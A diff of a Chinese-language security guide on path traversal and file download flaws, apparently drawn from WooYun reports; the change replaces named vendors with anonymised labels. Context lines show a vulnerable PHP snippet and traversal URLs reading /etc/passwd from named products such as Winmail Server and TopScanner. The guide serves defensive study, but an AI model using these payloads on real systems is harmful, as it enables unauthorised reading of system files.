@@ -320,7 +320,7 @@ do_download.jsp    (8次)
 ### 5.1 PHP漏洞代码特征
 
 ```php
-// 典型漏洞代码 (海康威视案例)
+// 典型漏洞代码 (某安防厂商案例)
 <?php
 $file_name = $_GET['fileName'];
 $file_dir = "../../../log/";
@@ -458,13 +458,13 @@ file:///C:/windows/win.ini
 ### 7.3 企业通用产品
 
 ```bash
-# 海康威视视频接入网关
+# 某安防厂商视频接入网关
 /serverLog/downFile.php?fileName=../../../etc/passwd
 
 # Winmail Server 6.0
 /viewsharenetdisk.php?userid=postmaster&opt=view&filename=[base64]
 
-# 天融信TopScanner
+# 某安全厂商TopScanner
 /task/saveTaskIpList.php?fileName=/etc/passwd
 
 # 悟空CRM
@@ -589,7 +589,7 @@ def safe_file_access(user_input, base_dir):
 | wooyun-2016-0170101 | 上海海事大学 | UTF-8超长编码 |
 | wooyun-2015-0130898 | 金智教育 | WEB-INF读取 |
 | wooyun-2015-0116637 | 淘客帝国 | Base64+file_get_contents |
-| wooyun-2015-0175625 | 海康威视 | PHP直接读取 |
+| wooyun-2015-0175625 | 某安防厂商 | PHP直接读取 |
 | wooyun-2014-087735 | Data门户 | file://协议 |
 
 ---
